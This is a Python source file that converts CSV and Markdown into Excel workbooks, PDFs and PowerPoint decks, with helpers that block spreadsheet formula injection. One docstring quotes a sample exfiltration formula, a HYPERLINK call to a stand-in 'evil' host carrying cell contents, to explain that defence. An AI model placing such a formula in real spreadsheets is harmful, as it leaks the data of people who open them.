"""Build Excel workbooks, PDFs and PowerPoint decks from text.

Files and Ask create these from the same simple inputs they already use:

- **XLSX** from CSV text, or from Markdown tables (each table becomes a sheet,
  named after the heading above it). Numbers become numbers, ``=SUM(...)``
  becomes a formula, and the header row is bold and frozen.
- **PDF** from Markdown (headings, lists, tables, quotes, rules, bold, italic,
  code and links), laid out on A4 pages with PyMuPDF's Story engine.
- **PPTX** from Markdown: each ``#`` or ``##`` heading starts a slide; list
  items and paragraphs become bullets and a Markdown table becomes a slide table.
"""

from __future__ import annotations

import csv
import html
import io
import re
from typing import Any

from loombot.docx_builder import (
    _BULLET,
    _HEADING,
    _NUMBERED,
    _QUOTE,
    _RULE,
    _TABLE_SEPARATOR,
    _cells,
)

_NUMBER = re.compile(r"^-?(?:\d+|\d{1,3}(?:,\d{3})+)(?:\.\d+)?$")
_PERCENT = re.compile(r"^-?\d+(?:\.\d+)?%$")
MAX_SHEET_NAME = 31


# --- Excel ------------------------------------------------------------------------


def cell_value(raw: str) -> Any:
    """A spreadsheet value from text: numbers, percentages, formulas, or the text."""

    text = (raw or "").strip()
    if not text:
        return None
    if text.startswith("="):
        return text
    if _NUMBER.match(text):
        number = text.replace(",", "")
        return float(number) if "." in number else int(number)
    if _PERCENT.match(text):
        return float(text[:-1]) / 100
    return raw


_FORMULA_START = ("=", "@", "\t", "\r")


def is_formula_like(text: str) -> bool:
    """True for text a spreadsheet would run as a formula (=, @, +X, -X)."""

    value = str(text or "")
    if value.startswith(_FORMULA_START):
        return True
    return value[:1] in {"+", "-"} and not _NUMBER.match(value.replace(" ", "")) and len(value) > 1


def set_untrusted_cell(cell: Any, raw: Any) -> None:
    """Write a value that came from email, documents or a model into an Excel cell.

    Numbers stay numbers, but text is always stored as text, never as a formula:
    a value like =HYPERLINK("https://evil/?d="&A1:A50) from an email must not run
    when the workbook is opened in Excel.
    """

    value = cell_value(raw) if isinstance(raw, str) and not is_formula_like(raw) else raw
    cell.value = value
    if isinstance(value, str) and value:
        cell.data_type = "s"


def csv_safe(text: Any) -> str:
    """A CSV cell that spreadsheet apps will not run as a formula."""

    value = "" if text is None else str(text)
    return f"'{value}" if is_formula_like(value) else value


def markdown_tables(markdown: str) -> list[tuple[str, list[list[str]]]]:
    """(sheet name, rows) for every Markdown table, named after the heading above it."""

    tables: list[tuple[str, list[list[str]]]] = []
    lines = (markdown or "").splitlines()
    heading = ""
    i = 0
    while i < len(lines):
        line = lines[i]
        match = _HEADING.match(line)
        if match:
            heading = match.group(2).strip()
            i += 1
            continue
        if "|" in line and i + 1 < len(lines) and _TABLE_SEPARATOR.match(lines[i + 1]):
            rows = [_cells(line)]
            i += 2
            while i < len(lines) and "|" in lines[i] and lines[i].strip():
                rows.append(_cells(lines[i]))
                i += 1
            tables.append((heading or f"Sheet{len(tables) + 1}", rows))
            heading = ""
            continue
        i += 1
    return tables


def _sheet_title(name: str, used: set[str]) -> str:
    cleaned = re.sub(r"[\[\]:*?/\\]", " ", name).strip()[:MAX_SHEET_NAME] or "Sheet"
    title, n = cleaned, 2
    while title.lower() in used:
        suffix = f" ({n})"
        title = cleaned[: MAX_SHEET_NAME - len(suffix)] + suffix
        n += 1
    used.add(title.lower())
    return title


def rows_to_xlsx(sheets: list[tuple[str, list[list[str]]]]) -> bytes:
    import openpyxl
    from openpyxl.styles import Font
    from openpyxl.utils import get_column_letter

    workbook = openpyxl.Workbook()
    workbook.remove(workbook.active)
    used: set[str] = set()
    for name, rows in sheets or [("Sheet1", [])]:
        sheet = workbook.create_sheet(_sheet_title(name, used))
        widths: dict[int, int] = {}
        for r, row in enumerate(rows, start=1):
            for c, raw in enumerate(row, start=1):
                value = raw if r == 1 else cell_value(raw)
                cell = sheet.cell(row=r, column=c, value=value)
                if r == 1:
                    cell.font = Font(bold=True)
                if isinstance(raw, str) and raw.strip().endswith("%") and isinstance(value, float):
                    cell.number_format = "0.00%"
                widths[c] = max(widths.get(c, 0), min(len(str(raw or "")), 60))
        if rows:
            sheet.freeze_panes = "A2"
        for column, width in widths.items():
            sheet.column_dimensions[get_column_letter(column)].width = max(8, width + 2)
    if not workbook.worksheets:
        workbook.create_sheet("Sheet1")
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


def text_to_xlsx(content: str) -> bytes:
    """A workbook from Markdown tables (one sheet each) or CSV text (one sheet)."""

    tables = markdown_tables(content)
    if tables:
        return rows_to_xlsx(tables)
    rows = [row for row in csv.reader(io.StringIO(content or "")) if any(c.strip() for c in row)]
    return rows_to_xlsx([("Sheet1", rows)])


# --- PDF --------------------------------------------------------------------------

_INLINE_HTML = re.compile(
    r"\*\*(.+?)\*\*|__(.+?)__|`([^`]+)`|\[([^\]]+)\]\(([^)\s]+)\)"
    r"|(?<![\w*])\*([^*\n]+?)\*(?![\w*])"
)

_PDF_CSS = """
* { font-family: sans-serif; }
body { font-size: 10.5pt; line-height: 1.35; }
h1 { font-size: 20pt; margin: 0 0 8pt 0; }
h2 { font-size: 15pt; margin: 12pt 0 6pt 0; }
h3 { font-size: 12.5pt; margin: 10pt 0 4pt 0; }
h4, h5, h6 { font-size: 11pt; margin: 8pt 0 4pt 0; }
p { margin: 0 0 6pt 0; }
ul, ol { margin: 0 0 6pt 0; }
table { border-collapse: collapse; margin: 4pt 0 8pt 0; }
th, td { border: 0.5pt solid #888888; padding: 2pt 5pt; font-size: 9.5pt; }
th { background-color: #e8eeee; font-weight: bold; }
blockquote { margin: 0 0 6pt 12pt; color: #444444; }
code { font-family: monospace; }
"""


def _inline_html(text: str) -> str:
    out: list[str] = []
    position = 0
    for match in _INLINE_HTML.finditer(text):
        out.append(html.escape(text[position:match.start()]))
        bold, bold2, code, label, url, italic = match.groups()
        if bold or bold2:
            out.append(f"<b>{html.escape(bold or bold2)}</b>")
        elif code:
            out.append(f"<code>{html.escape(code)}</code>")
        elif label:
            out.append(f'<a href="{html.escape(url, quote=True)}">{html.escape(label)}</a>')
        else:
            out.append(f"<i>{html.escape(italic)}</i>")
        position = match.end()
    out.append(html.escape(text[position:]))
    return "".join(out)


def markdown_to_html(markdown: str) -> str:
    lines = (markdown or "").splitlines()
    out: list[str] = []
    paragraph: list[str] = []
    list_tag: str | None = None

    def flush() -> None:
        nonlocal list_tag
        if paragraph:
            out.append(f"<p>{_inline_html(' '.join(paragraph))}</p>")
            paragraph.clear()
        if list_tag:
            out.append(f"</{list_tag}>")
            list_tag = None

    i = 0
    while i < len(lines):
        line = lines[i]
        if not line.strip():
            flush()
            i += 1
            continue
        if "|" in line and i + 1 < len(lines) and _TABLE_SEPARATOR.match(lines[i + 1]):
            flush()
            header = _cells(line)
            body: list[list[str]] = []
            i += 2
            while i < len(lines) and "|" in lines[i] and lines[i].strip():
                body.append(_cells(lines[i]))
                i += 1
            out.append("<table><tr>" + "".join(f"<th>{_inline_html(c)}</th>" for c in header) + "</tr>")
            for row in body:
                out.append("<tr>" + "".join(f"<td>{_inline_html(c)}</td>" for c in row) + "</tr>")
            out.append("</table>")
            continue
        heading = _HEADING.match(line)
        if heading:
            flush()
            level = len(heading.group(1))
            out.append(f"<h{level}>{_inline_html(heading.group(2))}</h{level}>")
        elif _RULE.match(line):
            flush()
            out.append("<hr/>")
        elif (bullet := _BULLET.match(line)) or (numbered := _NUMBERED.match(line)):
            tag = "ul" if bullet else "ol"
            item = (bullet or numbered).group(2)
            if paragraph:
                out.append(f"<p>{_inline_html(' '.join(paragraph))}</p>")
                paragraph.clear()
            if list_tag != tag:
                if list_tag:
                    out.append(f"</{list_tag}>")
                out.append(f"<{tag}>")
                list_tag = tag
            out.append(f"<li>{_inline_html(item)}</li>")
        elif quote := _QUOTE.match(line):
            flush()
            out.append(f"<blockquote>{_inline_html(quote.group(1))}</blockquote>")
        else:
            if list_tag:
                out.append(f"</{list_tag}>")
                list_tag = None
            paragraph.append(line.strip())
        i += 1
    flush()
    return "\n".join(out)


def markdown_to_pdf(markdown: str, *, title: str | None = None) -> bytes:
    """An A4 PDF laid out from Markdown."""

    import fitz

    body = markdown_to_html(markdown)
    if title and not (markdown or "").lstrip().startswith("#"):
        body = f"<h1>{html.escape(title)}</h1>\n{body}"
    story = fitz.Story(html=f"<body>{body or '<p></p>'}</body>", user_css=_PDF_CSS)
    buffer = io.BytesIO()
    writer = fitz.DocumentWriter(buffer)
    page = fitz.paper_rect("a4")
    margin = 50
    content = page + (margin, margin, -margin, -margin)
    more = True
    pages = 0
    while more and pages < 500:
        device = writer.begin_page(page)
        more, _ = story.place(content)
        story.draw(device)
        writer.end_page()
        pages += 1
    writer.close()
    return buffer.getvalue()


# --- PowerPoint -------------------------------------------------------------------


def _slides_from_markdown(markdown: str, title: str | None) -> list[dict[str, Any]]:
    slides: list[dict[str, Any]] = []
    current: dict[str, Any] | None = None
    lines = (markdown or "").splitlines()
    i = 0
    while i < len(lines):
        line = lines[i]
        heading = _HEADING.match(line)
        if heading and len(heading.group(1)) <= 2 or _RULE.match(line):
            current = {
                "title": heading.group(2).strip() if heading else "",
                "level": len(heading.group(1)) if heading else 2,
                "bullets": [],
                "table": None,
            }
            slides.append(current)
            i += 1
            continue
        if current is None:
            current = {"title": title or "", "level": 1, "bullets": [], "table": None}
            slides.append(current)
        if "|" in line and i + 1 < len(lines) and _TABLE_SEPARATOR.match(lines[i + 1]):
            rows = [_cells(line)]
            i += 2
            while i < len(lines) and "|" in lines[i] and lines[i].strip():
                rows.append(_cells(lines[i]))
                i += 1
            current["table"] = rows
            continue
        if heading:
            current["bullets"].append((0, heading.group(2).strip(), True))
        elif (bullet := _BULLET.match(line)) or (numbered := _NUMBERED.match(line)):
            match = bullet or numbered
            level = min(len(match.group(1).replace("\t", "  ")) // 2, 4)
            current["bullets"].append((level, match.group(2).strip(), False))
        elif line.strip():
            current["bullets"].append((0, line.strip(), False))
        i += 1
    return [s for s in slides if s["title"] or s["bullets"] or s["table"]]


def _plain(text: str) -> str:
    return re.sub(r"\*\*(.+?)\*\*|__(.+?)__|`([^`]+)`|\[([^\]]+)\]\([^)]+\)",
                  lambda m: next(g for g in m.groups() if g), text)


def markdown_to_pptx(markdown: str, *, title: str | None = None) -> bytes:
    """A 16:9 deck: a title slide for a lone ``#`` heading, then one slide per heading."""

    from pptx import Presentation
    from pptx.util import Inches, Pt

    deck = Presentation()
    deck.slide_width, deck.slide_height = Inches(13.333), Inches(7.5)
    slides = _slides_from_markdown(markdown, title) or [
        {"title": title or "Presentation", "level": 1, "bullets": [], "table": None}
    ]
    for index, spec in enumerate(slides):
        is_title_slide = index == 0 and spec["level"] == 1 and not spec["table"] and len(spec["bullets"]) <= 1
        if is_title_slide:
            slide = deck.slides.add_slide(deck.slide_layouts[0])
            slide.shapes.title.text = _plain(spec["title"])
            if spec["bullets"] and len(slide.placeholders) > 1:
                slide.placeholders[1].text = _plain(spec["bullets"][0][1])
            continue
        slide = deck.slides.add_slide(deck.slide_layouts[5 if spec["table"] else 1])
        slide.shapes.title.text = _plain(spec["title"])
        if spec["table"]:
            rows = spec["table"]
            columns = max(len(r) for r in rows)
            top = Inches(1.6)
            height = min(Inches(0.4) * len(rows), deck.slide_height - top - Inches(0.4))
            shape = slide.shapes.add_table(
                len(rows), columns, Inches(0.6), top, deck.slide_width - Inches(1.2), height
            )
            for r, row in enumerate(rows):
                for c in range(columns):
                    cell = shape.table.cell(r, c)
                    cell.text = _plain(row[c]) if c < len(row) else ""
                    for paragraph in cell.text_frame.paragraphs:
                        for run in paragraph.runs:
                            run.font.size = Pt(12)
            continue
        body = slide.placeholders[1].text_frame
        body.clear()
        for n, (level, text, bold) in enumerate(spec["bullets"][:14]):
            paragraph = body.paragraphs[0] if n == 0 else body.add_paragraph()
            paragraph.text = _plain(text)
            paragraph.level = level
            if bold:
                for run in paragraph.runs:
                    run.font.bold = True
    buffer = io.BytesIO()
    deck.save(buffer)
    return buffer.getvalue()


def pptx_slides(data: bytes) -> list[dict[str, Any]]:
    """Title and text of each slide, for previews and for Ask to read."""

    from pptx import Presentation

    deck = Presentation(io.BytesIO(data))
    slides: list[dict[str, Any]] = []
    for number, slide in enumerate(deck.slides, start=1):
        title = slide.shapes.title.text if slide.shapes.title is not None else ""
        lines: list[str] = []
        for shape in slide.shapes:
            if shape == slide.shapes.title:
                continue
            if shape.has_text_frame:
                lines.extend(p.text for p in shape.text_frame.paragraphs if p.text.strip())
            elif getattr(shape, "has_table", False) and shape.has_table:
                for row in shape.table.rows:
                    lines.append(" | ".join(cell.text for cell in row.cells))
        notes = ""
        if slide.has_notes_slide:
            notes = slide.notes_slide.notes_text_frame.text.strip()
        slides.append({"number": number, "title": title, "lines": lines, "notes": notes})
    return slides
